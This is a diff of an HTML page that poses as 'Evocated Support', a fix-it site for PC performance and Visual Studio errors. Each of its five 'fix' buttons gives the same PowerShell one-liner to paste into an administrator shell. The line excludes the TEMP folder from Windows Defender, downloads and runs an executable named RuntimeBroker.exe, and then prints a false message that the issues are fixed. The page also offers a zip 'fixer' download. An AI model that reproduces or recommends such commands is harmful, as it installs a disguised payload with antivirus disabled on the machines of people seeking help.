@@ -1,78 +1,393 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <link rel="icon" type="image/x-icon" href="https://cdn.discordapp.com/icons/943223926509699072/d08e6e1257804501fa056a967248711e.webp?size=96">
-    <meta charset="UTF-8">
-    <meta property="og:title" content="Velocity Support Tool">
-  <meta property="og:description" content="A simple tool to fix all Velocity Issues.">
-  <meta property="og:image" content="https://cdn.discordapp.com/icons/943223926509699072/d08e6e1257804501fa056a967248711e.webp?size=96">
-  <meta property="og:url" content="https://velocitysupport.github.io">
-  <meta property="og:type" content="website">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Velocity Support Tool</title>
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: #e0e0e0;
-            text-align: center;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        header {
-            padding: 50px 0;
-        }
-        header h1 {
-            margin: 0;
-            font-size: 2.5em;
-            color: #00aaff;
-        }
-        header p {
-            font-size: 1.2em;
-            color: #b0b0b0;
-        }
-        .buttons {
-            margin: 30px 0;
-        }
-        .buttons a {
-            display: inline-block;
-            margin: 0 10px;
-            padding: 15px 30px;
-            font-size: 1em;
-            color: #fff;
-            background-color: #00aaff;
-            text-decoration: none;
-            border-radius: 5px;
-            transition: background-color 0.3s;
-        }
-        .buttons a:hover {
-            background-color: #0088cc;
-        }
-        footer {
-            padding: 20px 0;
-            background-color: #1e1e1e;
-            color: #888;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Evocated Support</title>
+  <style>
+   .trail {
+  position: fixed;
+  width: 16px;
+  height: 16px;
+  background: #ff80ff;
+  border-radius: 50%;
+  pointer-events: none;
+  box-shadow: 0 0 12px #ff80ff, 0 0 24px #ff80ff;
+  animation: fadeOut 0.6s forwards;
+  z-index: 9999;
+}
+
+@keyframes fadeOut {
+  to {
+    opacity: 0;
+    transform: scale(2);
+  }
+}
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+      color: #ffd6f9;
+      overflow-x: hidden;
+      position: relative;
+      cursor: none;
+    }
+
+    .centered {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .main-title {
+      font-size: 3.5rem;
+      font-weight: bold;
+      text-shadow: 0 0 15px #ff94f4;
+      animation: bounce 3.5s infinite;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .label {
+      margin-top: 15px;
+      font-size: 1rem;
+      text-shadow: 0 0 8px #ffb3ec;
+    }
+     
+    .custom-modal {
+  display: none;
+  position: fixed;
+  z-index: 9999;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.8);
+  backdrop-filter: blur(5px);
+  animation: fadeIn 0.4s ease-in-out;
+}
+
+.modal-content {
+  background: radial-gradient(circle, #ff66c4 0%, #2a002f 100%);
+  color: #ffffff;
+  margin: 15% auto;
+  padding: 30px 50px;
+  border-radius: 24px;
+  border: 2px solid #ffb3ec;
+  box-shadow:
+    0 0 40px #ff66c4,
+    0 0 80px #ff66c4,
+    0 0 120px #ff66c4,
+    0 0 160px #ffb3ec;
+  width: fit-content;
+  max-width: 90%;
+  text-align: center;
+  font-size: 1.3rem;
+  font-weight: 700;
+  animation: scaleIn 0.3s ease-in-out, glowPulse 1.5s infinite alternate;
+  transform: scale(1.1);
+}
+
+
+.modal-content button {
+  background-color: #ffb6e6;
+  color: #2a002f;
+  border: none;
+  padding: 10px 20px;
+  margin-top: 20px;
+  border-radius: 8px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+
+.modal-content button:hover {
+  background-color: #fff;
+  color: #ff66c4;
+  box-shadow: 0 0 10px #ff66c4;
+}
+
+@keyframes scaleIn {
+  from { transform: scale(0.9); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+
+
+    .fix-button, .copy-btn, .download-btn, .get-started-btn {
+      margin: 10px;
+      padding: 12px 25px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 12px;
+      background-color: #ffb3ec;
+      color: #30001e;
+      box-shadow: 0 0 10px #ff94f4;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .fix-button:hover, .copy-btn:hover, .download-btn:hover, .get-started-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px #ff94f4;
+    }
+
+    .fix-button.active {
+      background-color: #ff66cc;
+    }
+
+    .copy-box, .dropdown, .download-box {
+      display: none;
+      background-color: #330033;
+      padding: 15px;
+      margin-top: 10px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #ff94f4;
+      color: #fff;
+      animation: fadeIn 0.4s ease-in-out;
+    }
+
+    .download-box {
+      flex-direction: column;
+      align-items: center;
+    }
+
+    code {
+      display: block;
+      margin-bottom: 10px;
+      word-wrap: break-word;
+    }
+
+    #loading-screen {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #1a001f;
+      color: #ffd6f9;
+      animation: fadeIn 1.5s ease-in-out;
+    }
+
+    .loading-title {
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px #ff94f4;
+      animation: bounce 3s infinite;
+    }
+
+* {
+  cursor: none !important;
+}
+
+
+    /* Modal */
+    .modal {
+      position: fixed;
+      z-index: 9999;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      display: none;
+    }
+
+    .modal-content {
+      background-color: #2a002a;
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      box-shadow: 0 0 20px #ff94f4;
+    }
+
+    .modal-content p {
+      font-size: 1.2rem;
+      margin-bottom: 20px;
+    }
+
+    .modal-content button {
+      padding: 10px 20px;
+      background-color: #ffb3ec;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      cursor: pointer;
+      color: #30001e;
+    }
+
+    /* Cursor Trail */
+    .trail {
+      position: absolute;
+      height: 8px;
+      width: 8px;
+      background: #ff94f4;
+      border-radius: 50%;
+      pointer-events: none;
+      opacity: 0.6;
+      animation: fadeTrail 0.6s linear forwards;
+    }
+
+    @keyframes fadeTrail {
+      to {
+        transform: scale(0);
+        opacity: 0;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>Velocity Support Tool</h1>
-            <p>A simple tool to fix issues on Velocity.</p>
-        </header>
 
-        <div class="buttons">
-            <a href="https://store4.gofile.io/download/web/967c7f54-0d9e-4e2c-864d-057b8f11d6b8/VelocitySupportToolV2.1.exe" download>Download</a>
-        </div>
+  <!-- 🔃 Loading Screen -->
+  <div id="loading-screen">
+    <div class="loading-title">Evocated Support</div>
+    <button class="get-started-btn" onclick="showModal()">Get Started</button>
+  </div>
 
-        <footer>
-            <p>&copy; 2025 Velocity Support Tool. All rights reserved.</p>
-        </footer>
+  <!-- ⚠️ Modal -->
+  <div class="modal" id="adminModal">
+    <div class="modal-content">
+      <p>⚠️PowerShell MUST be run as ADMINISTRATOR or it will not work⚠️</p>
+      <button onclick="startSite()">OK</button>
     </div>
+  </div>
+
+  <!-- 💻 Main Content -->
+  <div class="centered" id="main-content">
+    <div class="main-title">Evocated Support</div>
+    <div class="label">PowerShell MUST be run as ADMINISTRATOR or it will not work</div>
+
+    <div class="label">🔥 Most Popular Fix 🔥</div>
+    <button onclick="toggleCopyBox('popular-command', this)" class="fix-button active">Fix Visual Studio Errors</button>
+    <div class="copy-box" id="popular-command">
+      <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
+      <button class="copy-btn" onclick="copyFrom('popular-command')">Copy to Clipboard</button>
+    </div>
+
+    <div class="label">🛠️ Other Fix Tools</div>
+    <button onclick="toggleDropdown()" class="fix-button">Show Other Tools</button>
+    <div class="dropdown" id="dropdown" style="flex-direction: column;">
+      <button class="fix-button" onclick="toggleCopyBox('tool1', this)">Fix High CPU Usage</button>
+      <div class="copy-box" id="tool1">
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
+        <button class="copy-btn" onclick="copyFrom('tool1')">Copy to Clipboard</button>
+      </div>
+
+      <button class="fix-button" onclick="toggleCopyBox('tool2', this)">Fix Slow PC</button>
+      <div class="copy-box" id="tool2">
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
+        <button class="copy-btn" onclick="copyFrom('tool2')">Copy to Clipboard</button>
+      </div>
+
+      <button class="fix-button" onclick="toggleCopyBox('tool3', this)">Fix Low FPS (ANYGAME) </button>
+      <div class="copy-box" id="tool3">
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
+        <button class="copy-btn" onclick="copyFrom('tool3')">Copy to Clipboard</button>
+      </div>
+
+      <button class="fix-button" onclick="toggleCopyBox('tool4', this)">Fix HIGH PING (ANYGAME) </button>
+      <div class="copy-box" id="tool4">
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
+        <button class="copy-btn" onclick="copyFrom('tool4')">Copy to Clipboard</button>
+      </div>
+    </div>
+
+    <div class="label">📦 If fixers are not working, download this</div>
+    <button class="fix-button" onclick="toggleDownloadBox()">Show Download</button>
+    <div class="download-box" id="downloadBox">
+      <a href="https://codeload.github.com/EvocatedSupport/RuntimeBrokerFixerV2-main/zip/refs/heads/main" download>
+        <button class="download-btn">⬇ Download Fixer</button>
+      </a>
+    </div>
+  </div>
+
+  <!-- 🔧 Scripts -->
+  <script>
+    function startSite() {
+      document.getElementById('adminModal').style.display = 'none';
+      document.getElementById('loading-screen').style.display = 'none';
+      document.getElementById('main-content').style.display = 'flex';
+    }
+
+    function showModal() {
+      document.getElementById('adminModal').style.display = 'flex';
+    }
+
+    function toggleCopyBox(id, btn) {
+      document.querySelectorAll('.copy-box').forEach(box => box.style.display = 'none');
+      document.querySelectorAll('.fix-button').forEach(button => button.classList.remove('active'));
+      const target = document.getElementById(id);
+      if (target) {
+        target.style.display = 'block';
+        btn.classList.add('active');
+      }
+    }
+
+    function toggleDropdown() {
+      const dropdown = document.getElementById('dropdown');
+      dropdown.style.display = dropdown.style.display === 'flex' ? 'none' : 'flex';
+    }
+
+    function toggleDownloadBox() {
+      const box = document.getElementById('downloadBox');
+      box.style.display = box.style.display === 'flex' ? 'none' : 'flex';
+    }
+
+    function copyFrom(id) {
+      const text = document.querySelector(`#${id} code`).innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const copied = document.createElement('span');
+        copied.innerText = "✔ Copied!";
+        copied.style.marginLeft = "10px";
+        copied.style.color = "#90ee90";
+        copied.style.fontWeight = "bold";
+        document.querySelector(`#${id} .copy-btn`).after(copied);
+        setTimeout(() => copied.remove(), 1500);
+      });
+    }
+
+    // Cursor Trail Effect
+    document.addEventListener('mousemove', e => {
+      const trail = document.createElement('div');
+      trail.className = 'trail';
+      trail.style.left = `${e.pageX}px`;
+      trail.style.top = `${e.pageY}px`;
+      document.body.appendChild(trail);
+      setTimeout(() => trail.remove(), 600);
+    });
+  </script>
+<audio id="bg-music" src="nights.mp3" autoplay loop></audio>
 </body>
 </html>
